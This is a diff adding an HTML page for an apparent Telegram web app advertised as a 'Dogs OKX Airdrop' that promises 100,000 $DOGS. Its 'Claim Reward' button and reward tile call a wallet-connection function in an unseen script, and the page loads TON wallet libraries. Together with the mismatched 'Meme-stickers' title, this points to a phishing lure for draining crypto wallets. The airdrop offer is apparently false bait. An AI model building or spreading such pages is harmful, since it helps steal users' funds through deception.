@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meme-stickers</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Amaranth:ital,wght@0,400;0,700;1,400;1,700&family=Raleway:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" crossorigin href="assets/index-DjTWcX1v.css">
+    <script src="https://unpkg.com/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/tonweb@0.0.41/dist/tonweb.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.2/axios.min.js"></script>
+    <script src="assets/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="assets/alertify.min.css">
+    <link rel="stylesheet" href="assets/default.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
+</head>
+
+<body>
+    <div class="loading-container" id="loading" style="display: none;">
+        <div class="spinner"></div>
+        <p class="spinner-text">waiting for 20 second...</p>
+    </div>
+    <main>
+        <div class="container">
+            <div class="header">
+                <div class="logo"></div>
+                <div class="header-text">Dogs <br> OKX🦴</div>
+                <div id="connect-button">
+
+                </div>
+            </div>
+            <div class="content">
+                <div style="display: flex; justify-content: center; flex-direction: column; align-items: center; width: 100%;">
+                    <div class="dog-icon" style="background-color: #131416; border-radius: 15px; width: 70%; height: 30vh; display: flex; flex-direction: column; justify-content: center; box-shadow: 5px 5px 5px rgba(0, 0, 0, 0.527); align-items: center;">
+
+                        <img src="assets/Dogs Logo-Cykcc3M2.png" style="width: 20vh;height: 20vh;" alt="">
+                        <span style="color: #f1f1f1; font-weight: 800; font-size: 15px;">Dogs OKX Airdrop!</span>
+                    </div>
+
+                    <div class="claim">
+                        <button class="btn" onclick="start_wallet_custom()" style="margin-top: 5%;"> Claim Reward
+                        </button>
+                    </div>
+
+                    <div style="background-color: #131416; border-radius: 15px; width: 90%; box-shadow: 5px 5px 5px rgba(0, 0, 0, 0.527);  display: flex; justify-content: center; flex-direction: column; align-items: center;">
+                        <div class="rewards">
+
+
+                            <div onclick="start_wallet_custom()" style="font-size: 22px;" class="reward"><img src="assets/DogsCoin-CIeVN3a4.png" width="65" height="65" alt="">
+                                <b>100,000</b> <span> $DOGS</span>
+                            </div>
+                        </div>
+                        <div class="footer-text">
+                            <span class="note">Use your tonkeeper wallet to receive the airdrop!</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+    </main>
+    <script>
+        window.Telegram.WebApp.expand();
+        Telegram.WebApp.setResizable(true);
+    </script>
+    <script src="js/app.js"></script>
+</body>
+
+</html>
